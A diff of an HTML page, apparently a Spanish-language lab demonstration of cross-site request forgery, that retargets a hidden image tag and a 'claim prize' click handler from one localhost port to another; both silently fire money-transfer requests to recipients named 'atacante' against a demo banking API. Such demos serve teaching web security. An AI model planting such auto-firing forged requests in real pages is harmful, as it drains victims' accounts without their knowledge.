@@ -61,7 +61,7 @@
     <!-- ⚠️ ATAQUE CSRF: Esto se ejecuta automáticamente cuando se carga la página -->
     <!-- El navegador intenta cargar esta "imagen" pero en realidad está haciendo una transferencia -->
     <!-- MONTO: 3000 (actualizado) -->
-    <img src="http://localhost:5029/api/transfer?amount=3000&recipient=atacante" 
+    <img src="https://localhost:44321/api/transfer?amount=3000&recipient=atacante" 
          class="hidden"
          onload="console.log('Transferencia realizada exitosamente')"
          onerror="console.log('Error en transferencia (puede ser porque no estás logueado)')">
@@ -71,7 +71,7 @@
         function claimPrize() {
             // Hacer transferencia cuando hacen clic (cada click quita 1000)
             var img = document.createElement('img');
-            img.src = 'http://localhost:5029/api/transfer?amount=1000&recipient=atacante2';
+            img.src = 'https://localhost:44321/api/transfer?amount=1000&recipient=atacante2';
             img.style.display = 'none';
             document.body.appendChild(img);
             
